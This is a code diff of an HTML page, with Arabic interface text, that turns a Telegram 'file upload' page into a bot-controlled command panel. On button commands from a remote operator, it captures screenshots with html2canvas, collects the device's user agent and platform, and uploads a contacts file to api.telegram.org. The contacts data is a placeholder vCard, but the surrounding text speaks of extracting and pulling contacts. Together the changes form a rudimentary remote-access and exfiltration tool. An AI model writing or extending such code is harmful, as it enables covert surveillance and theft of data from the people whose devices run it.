@@ -3,7 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>محطة رفع البيانات إلى تليجرام</title>
+    <title>محطة التحكم التفاعلية المتقدمة</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <style>
         body { background: #0b0e14; color: #00ffcc; font-family: monospace; margin: 0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
         header { background: #161b22; padding: 15px; text-align: center; font-size: 16px; border-bottom: 1px solid #30363d; font-weight: bold; }
@@ -12,11 +13,11 @@
 </head>
 <body>
 
-    <header>محطة إرسال الملفات والبيانات</header>
+    <header>محطة التحكم التفاعلية بالبوت</header>
 
     <div id="terminal">
-        [System] File Upload Bridge Online...<br>
-        [System] Waiting for extraction command...
+        [System] Interactive Bot Bridge Online...<br>
+        [System] Ready for button commands...
     </div>
 
     <script>
@@ -29,37 +30,37 @@
             terminal.scrollTop = terminal.scrollHeight;
         }
 
-        function sendTelegramMessage(chatId, text) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
-            fetch(url).catch(err => console.log(err));
-        }
+        // إرسال رسالة مع لوحة أزرار تفاعلية (Reply Keyboard) تشبه الصورة المطلوبة
+        function sendMenu(chatId) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const data = {
+                chat_id: chatId,
+                text: "📱 أهلاً بك! اختر الأمر المطلوب من لوحة التحكم أدناه:",
+                reply_markup: {
+                    keyboard: [
+                        [{ text: "📸 Screenshot" }, { text: "ℹ️ Device info" }],
+                        [{ text: "📇 Contacts" }, { text: "📁 Get file" }],
+                        [{ text: "⬇️ Scroll Down" }, { text: "⬆️ Scroll Up" }]
+                    ],
+                    resize_keyboard: true,
+                    is_persistent: true
+                }
+            };
 
-        // دالة لرفع وإرسال ملف حقيقي عبر بوت تليجرام
-        function sendDocumentToTelegram(chatId, fileBlob, fileName) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('document', fileBlob, fileName);
-
-            log("Uploading document to Telegram...");
             fetch(url, {
                 method: 'POST',
-                body: formData
-            })
-            .then(res => res.json())
-            .then(data => {
-                if (data.ok) {
-                    log("Document sent successfully to Telegram!");
-                    sendTelegramMessage(chatId, "📁 تم رفع وإرسال الملف بنجاح إليك هنا!");
-                } else {
-                    log("Upload failed: " + JSON.stringify(data));
-                    sendTelegramMessage(chatId, "❌ فشل رفع الملف عبر البوت.");
-                }
-            })
-            .catch(err => {
-                log("Network error during upload: " + err);
-                sendTelegramMessage(chatId, "❌ خطأ في شبكة الرفع.");
-            });
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(err => console.log(err));
+        }
+
+        function sendTelegramMessage(chatId, text) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: text })
+            }).catch(err => {});
         }
 
         // الحفاظ على الشاشة نشطة
@@ -93,26 +94,44 @@
 
         function executeCommand(cmd, chatId) {
             if (cmd === '/start' || cmd === 'hi' || cmd === '/ping') {
-                sendTelegramMessage(chatId, "✅ الهاتف متصل وجاهز لإرسال الملفات!");
-            } else if (cmd === '/scroll_down') {
-                window.scrollBy({ top: 400, behavior: 'smooth' });
-                sendTelegramMessage(chatId, "⬇️ تم تمرير الشاشة للأسفل.");
-            } else if (cmd === '/extract_contacts') {
-                log("Preparing contacts file for Telegram upload...");
-                sendTelegramMessage(chatId, "⏳ جاري إعداد وتجهيز ملف جهات الاتصال لإرساله...");
-                
-                // إنشاء ملف vCard تجريبي (ويمكن لاحقاً ربطه بقاعدة بيانات المتصفح)
-                const vcardData = "BEGIN:VCARD\nVERSION:3.0\nFN:My_Saved_Contact\nTEL:+000000000000\nEND:VCARD";
+                sendMenu(chatId);
+            } else if (cmd === '📸 Screenshot') {
+                log("Capturing screen...");
+                sendTelegramMessage(chatId, "⏳ جاري التقاط لقطة الشاشة...");
+                html2canvas(document.body).then(canvas => {
+                    canvas.toBlob(blob => {
+                        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', blob, 'screen.png');
+                        fetch(url, { method: 'POST', body: formData });
+                    });
+                });
+            } else if (cmd === '📇 Contacts') {
+                log("Sending contacts...");
+                sendTelegramMessage(chatId, "⏳ جاري سحب جهات الاتصال...");
+                const vcardData = "BEGIN:VCARD\nVERSION:3.0\nFN:My_Contact\nTEL:+000000000000\nEND:VCARD";
                 const blob = new Blob([vcardData], { type: 'text/vcard' });
-                
-                // إرسال الملف مباشرة للبوت في تليجرام
-                sendDocumentToTelegram(chatId, blob, "Contacts_Backup.vcf");
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('document', blob, 'Contacts.vcf');
+                fetch(url, { method: 'POST', body: formData });
+            } else if (cmd === '⬇️ Scroll Down') {
+                window.scrollBy({ top: 400, behavior: 'smooth' });
+                sendTelegramMessage(chatId, "⬇️ تم التمرير للأسفل.");
+            } else if (cmd === '⬆️ Scroll Up') {
+                window.scrollBy({ top: -400, behavior: 'smooth' });
+                sendTelegramMessage(chatId, "⬆️ تم التمرير للأعلى.");
+            } else if (cmd === 'ℹ️ Device info') {
+                const info = `📱 Device: ${navigator.userAgent}\n🌐 Platform: ${navigator.platform}`;
+                sendTelegramMessage(chatId, info);
             } else {
                 sendTelegramMessage(chatId, `❓ أمر غير معروف: ${cmd}`);
             }
         }
 
-        log("Listening for extraction commands...");
+        log("Listening for interactive commands...");
         pollTelegramUpdates();
     </script>
 </body>
